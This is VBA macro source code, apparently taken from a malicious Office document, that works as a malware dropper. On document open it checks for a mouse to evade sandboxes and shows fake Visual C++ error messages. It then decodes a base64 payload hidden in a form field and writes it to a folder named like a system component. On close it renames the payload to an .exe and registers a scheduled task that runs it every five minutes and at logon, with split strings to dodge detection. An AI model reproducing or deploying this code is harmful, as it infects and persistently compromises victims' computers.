Public frequency As Integer

Public mainTargetPath As String
Public targetSubfolder As String
Public hostChunk As String
Public userChunk As String
Public bslash As String

Function RandString(n As Long) As String
     Dim i As Long, j As Long, m As Long, s As String, pool As String
     pool = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
     m = Len(pool)
     For i = 1 To n
         j = 1 + Int(m * Rnd())
         s = s & Mid(pool, j, 1)
     Next i
     RandString = s
End Function

Public Function b64Dec(EncBlob) As Byte()
    Dim data() As Byte
    Dim EncData() As Byte
    Dim DataLen As Long
    Dim EncLength As Long
    Dim EncData0 As Long
    Dim EncData1 As Long
    Dim EncData2 As Long
    Dim EncData3 As Long
    Dim l As Long
    Dim m As Long
    Dim Index As Long
    Dim CharCount As Long
    Const Equals As Byte = 61

    Const M1 As Byte = 3
    Const M2 As Byte = 15

    Const S2 As Byte = 4
    Const S4 As Byte = 16
    Const S6 As Byte = 64

    Dim B64Lookup() As Byte
    Dim B64Reverse() As Byte

    ReDim B64Reverse(255)
    B64Lookup = StrConv("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", vbFromUnicode)
    For l = 0 To 63
    B64Reverse(B64Lookup(l)) = l
    Next l
    EncData = StrConv(Replace$(Replace$(EncBlob, vbCrLf, ""), "=", ""), vbFromUnicode)

    EncLength = UBound(EncData) + 1
    DataLen = (EncLength \ 4) * 3

    m = EncLength Mod 4
    If m = 2 Then
    DataLen = DataLen + 1
    ElseIf m = 3 Then
    DataLen = DataLen + 2
    End If

    ReDim data(DataLen - 1)

    For l = 0 To UBound(EncData) - m Step 4
    EncData0 = B64Reverse(EncData(l))
    EncData1 = B64Reverse(EncData(l + 1))
    EncData2 = B64Reverse(EncData(l + 2))
    EncData3 = B64Reverse(EncData(l + 3))
    data(Index) = (EncData0 * S2) Or (EncData1 \ S4)
    data(Index + 1) = ((EncData1 And M2) * S4) Or (EncData2 \ S2)
    data(Index + 2) = ((EncData2 And M1) * S6) Or EncData3
    Index = Index + 3
    Next l

    Select Case ((UBound(EncData) + 1) Mod 4)
    Case 2
    EncData0 = B64Reverse(EncData(l))
    EncData1 = B64Reverse(EncData(l + 1))
    data(Index) = (EncData0 * S2) Or (EncData1 \ S4)
    Case 3
    EncData0 = B64Reverse(EncData(l))
    EncData1 = B64Reverse(EncData(l + 1))
    EncData2 = B64Reverse(EncData(l + 2))
    data(Index) = (EncData0 * S2) Or (EncData1 \ S4)
    data(Index + 1) = ((EncData1 And M2) * S4) Or (EncData2 \ S2)
    End Select

    b64Dec = data
End Function

Public Function DirIsWritable(dirPath As String) As Boolean
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    On Error GoTo falseState
    If Dir(dirPath, vbDirectory) = "" Then
    MkDir dirPath
    End If
    FName = "t.txt"
    t = writeFile(dirPath & bslash & FName, "1")
    If objFSO.FileExists(dirPath & bslash & FName) Then
    Kill dirPath & bslash & FName
    DirIsWritable = True
    Exit Function
    End If
falseState:
   DirIsWritable = False
    Exit Function
End Function

Public Function writeFile(path As String, data)
    Dim fn As Integer
    fn = FreeFile
    Open path For Binary Lock Read Write As #fn
    Dim beacher() As Byte
    beacher = data
    Put fn, 1, beacher
    Close #fn
End Function

Function SchTask(TaskName As String, DirPath As String, Interval As Integer)

    Dim schSvc
    Set schSvc = CreateObject("Schedule.Service")
    Call schSvc.Connect

    Dim rootTaskFolder
    Set rootTaskFolder = schSvc.GetFolder("\")

    Dim taskDef
    Set taskDef = schSvc.NewTask(0)

    Dim taskSettings
    Set taskSettings = taskDef.settings
    taskSettings.StartWhenAvailable = True

    Const TriggerIdReg = 7
    Dim taskTriggers
    Set taskTriggers = taskDef.triggers

    Dim regTrigger
    Set regTrigger = taskTriggers.Create(TriggerIdReg)
    regTrigger.ID = TaskName & "RegistrationTrigger"

    Dim repPattern
    Set repPattern = regTrigger.Repetition
    repPattern.Interval = "PT" & Interval & "M"

    Const TriggerIdLogon = 9

    Dim logonTrigger
    Set logonTrigger = taskTriggers.Create(TriggerIdLogon)
    logonTrigger.ID = TaskName & "LogonTrigger"

    logonTrigger.UserId = Environ("userdomain") & "\" & Environ("username")

    Set repPattern = logonTrigger.Repetition
    repPattern.Interval = "PT" & Interval & "M"

    Const ActionIdExecutable = 0
    Dim taskAction
    Set taskAction = taskDef.Actions.Create(ActionIdExecutable)
    taskAction.path = DirPath & "\" & TaskName & ".e" & "xe"

    Call rootTaskFolder.RegisterTaskDefinition(TaskName, taskDef, 6, , , 3)
End Function

Sub Document_Open()
    bslash = "\"

    hostChunk = LCase(Environ("computername"))
    hostChunk = Mid(hostChunk, Len(hostChunk) - 3, 4)
    userChunk = Mid(LCase(Environ("userChunk")), 1, 3)

    If Application.Visible Then
        If Application.MouseAvailable = False Then
            MsgBox "Microsoft Visual C++ Redistributable Error:0x801"

            Exit Sub

        Else
            mainTargetPath = LCase(Environ("localappdata"))
            targetSubfolder = "System" & "Failure" & "Reporter"

            If DirIsWritable(mainTargetPath) Then
                MkDir mainTargetPath & bslash & targetSubfolder
            End If

            t = ""
            t = UserForm1.TextBox1.Text
            output = b64Dec(t)

            t = writeFile(mainTargetPath & bslash & targetSubfolder & bslash & "b." & "doc", output)
            t = writeFile(mainTargetPath & bslash & targetSubfolder & bslash & "update." & "xml", "test")

        End If
    End If

End Sub

Sub Document_Close()

    If Application.Visible Then
        If Application.MouseAvailable = False Then
            MsgBox "Microsoft Visual C++ Redistributable Error:0x802"
            Exit Sub
        Else
            Set fso = CreateObject("Scripting.FileSystemObject")
            pth = mainTargetPath & bslash & targetSubfolder & bslash
            a = pth & "b." & "doc"
            b = pth & "System" & "Failure" & "Reporter" & ".ex" & "e"
            If fso.FileExists(a) And Not (fso.FileExists(b)) Then
            	Name a As b
            End If

            Result = SchTask(targetSubfolder, mainTargetPath & bslash & targetSubfolder, 5)
        End If
    End If
End Sub
